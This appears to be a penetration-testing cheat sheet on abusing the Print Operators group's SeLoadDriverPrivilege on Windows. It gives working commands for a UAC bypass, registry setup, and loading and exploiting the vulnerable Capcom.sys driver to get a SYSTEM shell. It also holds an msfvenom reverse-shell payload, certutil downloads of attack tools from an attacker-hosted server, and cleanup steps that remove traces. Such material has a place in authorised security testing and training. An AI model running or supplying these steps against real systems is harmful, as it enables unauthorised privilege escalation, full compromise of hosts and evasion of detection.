## Print Operators

The Print Operators group is dangerous far beyond printing. It grants members `SeLoadDriverPrivilege` and the right to log on locally to Domain Controllers. Loading a kernel-level driver running as SYSTEM is Ring 0 code execution, which is a complete system compromise. 

***

## The Core Mechanism

```
Print Operators member has SeLoadDriverPrivilege
    |
    v
Enable the privilege (disabled by default, UAC bypass may be needed first)
    |
    v
Create a registry key under HKCU pointing to a vulnerable signed driver
    |
    v
Call NTLoadDriver to load the driver into kernel space
    |
    v
Exploit the loaded driver to execute shellcode as NT AUTHORITY\SYSTEM
```

**OS version caveat**: Since Windows 10 Version 1803, `NTLoadDriver` blocks references to registry keys under `HKEY_CURRENT_USER`. This entire technique only works on systems below that build. 

***

## Step 1: Confirm Membership and Privilege State

```cmd
:: Check group membership
whoami /groups | findstr "Print Operators"
net localgroup "Print Operators"

:: Check privilege state (requires elevated session to see SeLoadDriverPrivilege)
whoami /priv | findstr SeLoadDriverPrivilege

:: If run from non-elevated context you will see very few privileges
:: SeLoadDriverPrivilege will not appear at all - not just Disabled
```

***

## Step 2: UAC Bypass (If Needed)

If `SeLoadDriverPrivilege` does not appear in `whoami /priv`, you are running in a non-elevated context and need to bypass UAC first. 

:: Option 1: Open elevated CMD with Print Operators user credentials (GUI)
:: Right-click cmd.exe -> Run as administrator -> enter Print Operators account credentials

:: Option 2: Automated UAC bypass via UACMe
:: https://github.com/hfiref0x/UACME
:: UACMe contains 60+ bypass methods
.\Akagi64.exe 23 C:\Windows\system32\cmd.exe
:: Method 23 = using fodhelper.exe
:: Method 41 = using sfc.exe
:: Method 61 = using dccw.exe

:: Option 3: PowerShell UAC bypass via registry hijack (no external tools)
$cmd = "cmd.exe /c start cmd.exe"
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $cmd -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
# Clean up after:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

***

## Step 3: Compile EnableSeLoadDriverPrivilege.exe

This tool enables the privilege in your current token. Before compiling, prepend these includes to the source file: [rioasmara](https://rioasmara.com/2020/11/03/seloaddriverprivilege-right-to-priv-esc-with-capcom-sys/)

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

```cmd
:: Compile from Visual Studio 2019 Developer Command Prompt
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

:: Run it to enable SeLoadDriverPrivilege
EnableSeLoadDriverPrivilege.exe

:: Verify it is now Enabled
whoami /priv | findstr SeLoadDriverPrivilege
:: SeLoadDriverPrivilege    Load and unload device drivers    Enabled
```

***

## Step 4: Set Up the Driver Registry Key

`NTLoadDriver` reads driver configuration from a registry key. Since admin rights are needed to write to `HKLM`, the technique uses `HKCU` instead (valid only on pre-1803 systems): 

```cmd
:: Add registry key for Capcom.sys
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

:: The \??\ prefix is the NT Object Manager path notation
:: It tells the kernel to resolve this as a device path, not a Win32 path

:: Verify the key was written
reg query HKCU\System\CurrentControlSet\CAPCOM
```

***

## Step 5: Load the Driver

```cmd
:: Method 1: EoPLoadDriver - automated tool that enables privilege, creates key, and calls NTLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
:: [+] Enabling SeLoadDriverPrivilege
:: [+] SeLoadDriverPrivilege Enabled
:: [+] Loading Driver: \Registry\User\S-1-5-21-...\System\CurrentControlSet\Capcom
:: NTSTATUS: 00000000, WinError: 0

:: Method 2: Run EnableSeLoadDriverPrivilege.exe (already done in step 3), then use NTLoadDriver directly
:: EnableSeLoadDriverPrivilege.exe handles both enabling the privilege and loading the driver

:: Verify Capcom.sys is now loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -Pattern Capcom
:: Driver Name: Capcom.sys
:: Filename: C:\Tools\Capcom.sys
```

***

## Step 6: Exploit Capcom.sys for SYSTEM Shell

```cmd
:: If GUI access is available - spawns interactive SYSTEM cmd
.\ExploitCapcom.exe

:: If no GUI - modify ExploitCapcom.cpp before compiling
:: Change line 292 from:
::   TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
:: To:
::   TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");

:: Generate the reverse shell payload first
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe -o revshell.exe
```

***

## Automated One-Step Path

If you do not want to manually compile tools, use EoPLoadDriver combined with ExploitCapcom as a two-binary approach: 

```cmd
:: Transfer both binaries and Capcom.sys to target
:: From attack machine:
:: python3 -m http.server 7777

:: On target (elevated cmd):
certutil -urlcache -split -f http://10.10.14.3:7777/EoPLoadDriver.exe C:\Tools\EoPLoadDriver.exe
certutil -urlcache -split -f http://10.10.14.3:7777/Capcom.sys C:\Tools\Capcom.sys
certutil -urlcache -split -f http://10.10.14.3:7777/ExploitCapcom.exe C:\Tools\ExploitCapcom.exe

:: Run EoPLoadDriver to enable privilege and load driver
C:\Tools\EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys

:: Exploit for SYSTEM shell
C:\Tools\ExploitCapcom.exe
```

***

## Cleanup

```cmd
:: Remove the registry key
reg delete HKCU\System\CurrentControlSet\Capcom /f

:: Unload the driver (requires admin or SYSTEM)
:: If ExploitCapcom already gave you SYSTEM, unload from that shell
sc delete Capcom

:: Remove uploaded binaries
del C:\Tools\Capcom.sys
del C:\Tools\EoPLoadDriver.exe
del C:\Tools\ExploitCapcom.exe
```

***

## Version Check - Is the System Vulnerable?

```cmd
:: Check Windows 10 build number
winver
systeminfo | findstr "OS Version"

:: Vulnerable:    Before Windows 10 Version 1803 (Build 17134)
:: Not Vulnerable: Windows 10 1803 (Build 17134) and above
:: HKCU-based driver loading is blocked on 1803+
```

For Windows 10 1803+ systems, alternative approaches include exploiting other `SeLoadDriverPrivilege` mechanisms that do not rely on HKCU, or pivoting to a different attack surface entirely (SeImpersonatePrivilege if also present, or service misconfigurations). 
